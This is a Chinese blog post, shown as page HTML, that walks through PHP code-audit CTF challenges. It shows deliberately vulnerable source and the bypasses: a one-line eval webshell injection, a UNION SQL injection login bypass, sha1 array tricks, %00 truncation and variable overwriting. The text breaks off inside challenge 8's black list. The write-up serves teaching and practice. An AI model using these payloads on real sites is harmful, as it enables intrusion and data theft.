@@ -1,0 +1,770 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Pooka.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Pooka.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"npfs06.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="PHP_Code_challenge(代码审计) write up">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP_Code_challenge(代码审计)">
+<meta property="og:url" content="https://npfs06.top/2020/04/20/PHP-Code-challenge-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:site_name" content="安小琪&#39;s blog">
+<meta property="og:description" content="PHP_Code_challenge(代码审计) write up">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-04-20T15:40:35.000Z">
+<meta property="article:modified_time" content="2020-04-20T15:40:35.000Z">
+<meta property="article:author" content="安小琪">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://npfs06.top/2020/04/20/PHP-Code-challenge-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>PHP_Code_challenge(代码审计) | 安小琪's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">安小琪's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">少年有梦，不应止于心动</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://npfs06.top/2020/04/20/PHP-Code-challenge-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="安小琪">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安小琪's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PHP_Code_challenge(代码审计)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-04-20 23:40:35" itemprop="dateCreated datePublished" datetime="2020-04-20T23:40:35+08:00">2020-04-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Write-up/" itemprop="url" rel="index"><span itemprop="name">Write up</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2020/04/20/PHP-Code-challenge-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/04/20/PHP-Code-challenge-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>PHP_Code_challenge(代码审计) write up<a id="more"></a></p>
+<h1 id="challenge-1"><a href="#challenge-1" class="headerlink" title="challenge 1"></a>challenge 1</h1><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/lib.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(hex2bin(strrev(bin2hex(<span class="variable">$flag</span>)))), <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+
+<p>python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strrev</span>(<span class="params">string</span>):</span></span><br><span class="line">    <span class="keyword">return</span> string[::-<span class="number">1</span>]</span><br><span class="line">a=<span class="string">&quot;1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=&quot;</span></span><br><span class="line">b=binascii.a2b_hex(strrev(binascii.b2a_hex(base64.b64decode(a))))</span><br><span class="line"><span class="built_in">print</span> (b)</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>binascii模块用来进行进制和字符串之间的转换<br>base64模块是用来作base64编码解码<br>[::-1]取反，这里-1为步长</p>
+</blockquote>
+<h1 id="challenge-2"><a href="#challenge-2" class="headerlink" title="challenge 2"></a>challenge 2</h1><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/lib.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;The time must be number.&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;This time is too short.&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;This time is too long.&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        sleep((<span class="keyword">int</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>sleep() 函数用来推迟调用线程的运行<br>(int)强转换，可以用科学记数法绕过</p>
+</blockquote>
+<h1 id="challenge-3"><a href="#challenge-3" class="headerlink" title="challenge 3"></a>challenge 3</h1><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!--challenge3.txt--&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/lib.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">    header(<span class="string">&#x27;Location: challenge3.php?id=1&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos(<span class="variable">$a</span>,<span class="string">&#x27;.&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hahahahahaha&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = @file_get_contents(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>==<span class="string">&quot;1112 is a nice lab!&quot;</span> <span class="keyword">and</span> <span class="variable">$id</span>==<span class="number">0</span> <span class="keyword">and</span> strlen(<span class="variable">$b</span>)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">&quot;111&quot;</span>.substr(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>) <span class="keyword">and</span> substr(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;work harder!harder!harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>a–&gt;</p>
+<p> ①不存在’.’号或’.’号再开头；</p>
+<p> ②<code>$data = @file_get_contents($a,&#39;r&#39;);</code>把a写入字符串中要为1112 is a nice lab!</p>
+<p>b–&gt;</p>
+<p>①长度大于五</p>
+<p>②截取b的第一位和111拼接能和1114匹配</p>
+<p>③b的第一位不为4</p>
+<p>id–&gt;</p>
+<p>①不为0或NULL（不为空）</p>
+<p>②弱等于0</p>
+<blockquote>
+<p>a:   $a=php://input;     post:1112 is a nice lab!<br>b:   %00截断，%00截断对substr有效，对strlen无效（即%00不会对strlen截断）<br>php弱类型比较，数字与字符串等值比较时，字符串取开头的有效数字，无则为0</p>
+</blockquote>
+<h1 id="challenge-4"><a href="#challenge-4" class="headerlink" title="challenge 4"></a>challenge 4</h1><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>); </span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>构造一句话木马   <code>?hello=);eval($_POST[value]);%23</code><br>当var_dump($a);后的结果为：<code>string(22) &quot;);eval($_POST[value]);#&quot;</code><br><code>eval(&quot;string(23) &quot;);eval($_POST[value]);//&quot;&quot;);</code></p>
+</blockquote>
+<blockquote>
+<p>PHP对于双引号包裹起来的字符串要进行扫描计算，单引号则不管内容如何都会原样输出而不会进行计算。</p>
+</blockquote>
+<h1 id="challenge-5"><a href="#challenge-5" class="headerlink" title="challenge 5"></a>challenge 5</h1><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) === sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Login first!&lt;/p&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>sha1无法处理数组，因此可构造数组绕过,数组传入结果为NULL</p>
+</blockquote>
+<h1 id="challenge-6"><a href="#challenge-6" class="headerlink" title="challenge 6"></a>challenge 6</h1><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[user] &amp;&amp; <span class="variable">$_POST</span>[pass]) &#123;</span><br><span class="line">	<span class="variable">$conn</span> = mysql_connect(<span class="string">&quot;********&quot;</span>, <span class="string">&quot;*****&quot;</span>, <span class="string">&quot;********&quot;</span>);</span><br><span class="line">	mysql_select_db(<span class="string">&quot;challenges&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Could not select database&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . mysql_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_POST</span>[user];</span><br><span class="line"><span class="variable">$pass</span> = md5(<span class="variable">$_POST</span>[pass]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pwd from interest where uname=&#x27;<span class="subst">$user</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$query</span>) &#123;</span><br><span class="line">	printf(<span class="string">&quot;Error: %s\n&quot;</span>, mysql_error(<span class="variable">$conn</span>));</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$query</span>, MYSQL_ASSOC);</span><br><span class="line"><span class="comment">//echo $row[&quot;pwd&quot;];</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="variable">$row</span>[pwd]) &amp;&amp; (!strcasecmp(<span class="variable">$pass</span>, <span class="variable">$row</span>[pwd]))) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>联合查询注入漏洞,构造 username=-1’union select”md5(123)”#&amp;pass=123</p>
+</blockquote>
+<h1 id="challenge-7"><a href="#challenge-7" class="headerlink" title="challenge 7"></a>challenge 7</h1><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$_403</span> = <span class="string">&quot;Access Denied&quot;</span>;</span><br><span class="line"><span class="variable">$_200</span> = <span class="string">&quot;Welcome Admin&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] != <span class="string">&quot;POST&quot;</span>)  <span class="comment"># 要为POST</span></span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&quot;BugsBunnyCTF is here :p...&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>]) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$_403</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>] !== <span class="variable">$flag</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$_403</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is your flag : &quot;</span>. <span class="variable">$flag</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$_200</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>可在flag被修改之前，先将flag覆盖<br>程序执行顺序foreach ($_GET as $key =&gt; $value) 比  foreach ($_POST as $key =&gt; $value)先执行，因此可利用foreach ($_GET as $key =&gt; $value) 将flag覆盖</p>
+</blockquote>
+<blockquote>
+<p>$$key = $$value 看到这个，想到变量覆盖</p>
+</blockquote>
+<h1 id="challenge-8"><a href="#challenge-8" class="headerlink" title="challenge 8"></a>challenge 8</h1><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;On&quot;</span>);</span><br><span class="line">error_reporting(E_ALL | E_STRICT);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line"><span class="comment">#需要GET一个变量c</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_string</span>(<span class="params"> <span class="variable">$length</span> </span>) </span>&#123;</span><br><span class="line">    <span class="variable">$chars</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line">    <span class="variable">$size</span> = strlen( <span class="variable">$chars</span> );</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="variable">$str</span> .= <span class="variable">$chars</span>[ rand( <span class="number">0</span>, <span class="variable">$size</span> - <span class="number">1</span> ) ];</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#生成$length长度的随机字符串</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$black_list</span> = <span class="keyword">array</span>(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span 